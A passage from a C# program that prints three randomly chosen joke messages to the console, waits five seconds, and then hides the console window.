                "Warning: Excessive sl0ppy energy may cause spontaneous shell sessions.",
                "Stay cyan, stay curious, and keep those terminals busy. ;)"
            };

            Random rng = new Random();
            int start = rng.Next(lines.Length);

            Console.WriteLine("\n");
            for (int i = 0; i < 3; i++)
            {
                Console.WriteLine($" [%] {lines[(start + i) % lines.Length]}");
            }

            Thread.Sleep(5000);
            ShowWindow(consoleHandle, SW_HIDE);
        }
    }
}
